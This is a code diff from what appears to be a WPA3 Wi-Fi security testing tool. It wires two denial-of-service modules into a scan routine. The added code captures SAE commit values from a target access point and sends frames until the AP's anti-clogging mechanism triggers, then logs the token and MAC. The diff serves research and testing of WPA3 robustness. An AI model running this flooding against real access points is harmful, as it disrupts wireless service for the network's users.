@@ -7,6 +7,8 @@
 #include <sys/poll.h>
 
 #include "attacks/components/sniffer_helper.h"
+#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
+#include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"
 using namespace std;
 using namespace filesystem;
 using namespace Tins;
@@ -131,6 +133,7 @@ namespace wpa3_tester::attack_scan{
 
 
     void run_attack(RunStatus& rs) {
+        rs.start_observers();
         const auto& att_cfg = rs.config.at("attack_config");
         const auto target_ap = rs.get_actor("target");
         const auto scanner = rs.get_actor("scanner");
@@ -178,10 +181,23 @@ namespace wpa3_tester::attack_scan{
             }
         }
 
-        /*if (att_cfg.value("ACM", false)) {
-            if (target_ap->bool_conditions["WPA3-SAE"].has_value()) {
-                //TODO  Logika pro WPA3...
-            }
-        }*/
+        if (att_cfg.value("ACM_trigger", false)) {
+            const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
+                rs, scanner["iface"], scanner["sniff_iface"], scan_ap.ssid, target_ap["mac"], 30);
+
+            const auto [cookie, count] = pmk_gobbler::trigger_acm(
+                scanner["sniff_iface"],
+                scanner["mac"],
+                HWAddress<6>(target_ap["mac"]),
+                att_cfg.at("acm_trigger_count").get<int>(),
+                sae_params.value()
+            );
+
+            ofstream ofs(path(rs.run_folder) / "ACM_trigger.txt");
+            ofs << "ACM trigger after " << count << " frames " << "\n";
+            ofs << scan_ap.to_str() << "\n";
+            ofs << dos_helpers::bytes_to_hex(cookie.token) << "\n";
+            ofs << cookie.sta_mac << "\n";
+        }
     }
 }
